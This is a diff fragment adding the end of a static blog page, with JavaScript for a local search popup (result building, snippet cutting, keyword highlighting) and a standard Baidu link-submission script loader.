+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+</body>
+</html>
